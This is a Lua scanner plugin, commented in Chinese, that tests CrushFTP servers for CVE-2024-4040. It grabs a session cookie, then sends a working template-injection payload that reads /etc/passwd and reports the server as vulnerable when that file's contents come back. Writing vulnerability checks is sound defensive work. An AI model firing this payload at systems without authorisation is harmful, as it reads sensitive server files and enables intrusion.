-- CVE-2024-4040 漏洞检测函数
function check_CVE_2024_4040(target)
    print("[CrushFTP] Starting CVE-2024-4040 check for", target)
    
    -- 第一步: 获取初始 auth token
    local resp = http.get(target .. "/WebInterface/", {
        timeout = 10,
        headers = {
            ["Host"] = target:match("https?://([^/]+)"),
            ["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        }
    })
    
    if not resp then
        print("[CrushFTP] Failed to get initial page: no response")
        return nil
    end
    print("[CrushFTP] Initial page status:", resp.status)

    -- 从响应头中提取 auth token
    local auth_token = nil
    if resp.headers["Set-Cookie"] then
        auth_token = string.match(resp.headers["Set-Cookie"], "currentAuth=([0-9a-zA-Z]+)")
        print("[CrushFTP] Found auth token:", auth_token or "nil")
    end
    
    if not auth_token then
        print("[CrushFTP] No auth token found in response")
        return nil
    end

    -- 第二步: 尝试未授权漏洞利用
    local exploit_url = target .. "/WebInterface/function/"
    local post_data = string.format("command=zip&c2f=%s&path=<INCLUDE>/etc/passwd</INCLUDE>&names=/bbb", auth_token)
    
    print("[CrushFTP] Attempting exploit URL:", exploit_url)
    print("[CrushFTP] Post data:", post_data)
    
    local exploit_resp = http.post(exploit_url, {
        timeout = 10,
        headers = {
            ["Host"] = target:match("https?://([^/]+)"),
            ["Content-Type"] = "application/x-www-form-urlencoded",
            ["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            ["Accept"] = "text/xml",
            ["Cookie"] = string.format("currentAuth=%s", auth_token)
        },
        data = post_data
    })

    -- 检查是否成功
    if exploit_resp then
        print("[CrushFTP] Exploit response status:", exploit_resp.status)
        print("[CrushFTP] Response body:", string.sub(exploit_resp.body or "", 1, 200))
        
        -- 检查响应中是否包含 /etc/passwd 内容
        if exploit_resp.body and string.match(exploit_resp.body, "root:x:") then
            print("[CrushFTP] Vulnerability confirmed! Found /etc/passwd content")
            local result = {
                CVEID = "CVE-2024-4040",
                Severity = "critical",
                Type = "VFS Sandbox Escape",
                Extra = {
                    ["Description"] = "CrushFTP VFS Sandbox Escape vulnerability allows unauthorized file read",
                    ["Proof"] = string.sub(exploit_resp.body, 1, 200)
                }
            }
            print("[CrushFTP] Vulnerability details:", result.CVEID, "(Severity:", result.Severity, ")")
            return result
        else
            print("[CrushFTP] No /etc/passwd content found in response")
        end
    else
        print("[CrushFTP] Exploit request failed: no response")
    end

    return nil
end

function Analyze(info)
    if not info or not info.IP or not info.Port then
        print("[CrushFTP] Invalid ServiceInfo: missing IP or Port")
        return info
    end

    print("[CrushFTP] Starting analysis for", info.IP..":", info.Port)
    
    -- 构造目标URL
    local target = string.format("http://%s:%d", info.IP, info.Port)
    print("[CrushFTP] Target URL:", target)
    
    -- 检查各个CVE
    local vulns = {}
    
    -- 检查 CVE-2024-4040
    local result = check_CVE_2024_4040(target)
    if result then
        table.insert(vulns, result)
        print("[CrushFTP] Added vulnerability:", result.CVEID)
    end
    
    -- 如果发现漏洞，添加到结果中
    if #vulns > 0 then
        info.Vulnerabilities = vulns
        print("[CrushFTP] Total vulnerabilities found:", #vulns)
    else
        print("[CrushFTP] No vulnerabilities found")
    end

    return info
end

 


